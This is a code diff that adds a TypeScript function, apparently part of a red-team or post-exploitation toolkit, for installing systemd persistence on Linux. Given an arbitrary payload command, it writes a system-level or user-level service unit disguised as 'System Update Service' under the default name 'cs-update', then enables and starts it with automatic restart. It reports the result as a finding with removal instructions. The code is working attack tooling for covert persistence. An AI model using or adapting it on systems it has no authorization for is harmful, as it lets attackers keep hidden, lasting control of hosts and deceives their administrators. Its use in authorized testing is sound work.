@@ -71,3 +71,91 @@ fi
 
   return { output: output.join("\n"), findings }
 }
+
+export async function systemdPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Systemd Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const name = argVal(args, "--name") || "cs-update"
+  const userLevel = hasFlag(args, "--user")
+
+  const script = `
+echo "--- Init System Check ---"
+if [ -d /run/systemd/system ]; then
+  echo "[+] systemd is the init system"
+else
+  echo "[-] systemd is NOT running — this persistence method will not work"
+  exit 1
+fi
+echo ""
+echo "--- Existing Custom Services ---"
+${userLevel ? `
+ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user services directory"
+systemctl --user list-units --type=service --no-pager 2>/dev/null | head -20
+` : `
+find /etc/systemd/system/ -maxdepth 1 -name "*.service" -newer /etc/systemd/system 2>/dev/null | head -20
+systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
+`}
+echo ""
+${payload ? `
+echo "--- Installing Systemd Persistence ---"
+${userLevel ? `
+mkdir -p ~/.config/systemd/user 2>/dev/null
+cat > ~/.config/systemd/user/${name}.service << 'UNIT'
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=${payload}
+Restart=on-failure
+RestartSec=60
+
+[Install]
+WantedBy=default.target
+UNIT
+systemctl --user daemon-reload 2>/dev/null
+systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}.service" || echo "[-] Failed to enable user service"
+systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start user service"
+` : `
+cat > /etc/systemd/system/${name}.service << 'UNIT'
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=${payload}
+Restart=on-failure
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+UNIT
+systemctl daemon-reload 2>/dev/null
+systemctl enable ${name}.service 2>/dev/null && echo "[+] Service enabled: ${name}.service" || echo "[-] Failed to enable service"
+systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || echo "[-] Failed to start service"
+`}
+` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Service enabled") || r.stdout.includes("[+] User service enabled")) {
+    findings.push({
+      checkId: "LNX-SYSDP-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: `systemd/${name}.service`,
+      title: `Systemd ${userLevel ? "user " : ""}service persistence installed`,
+      details: `Service ${name}.service created and enabled${userLevel ? " at user level (no root needed)" : " at system level"}. Restarts on failure with 60s delay.`,
+      remediation: `Remove with: systemctl ${userLevel ? "--user " : ""}disable --now ${name}.service && rm ${userLevel ? "~/.config/systemd/user" : "/etc/systemd/system"}/${name}.service`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
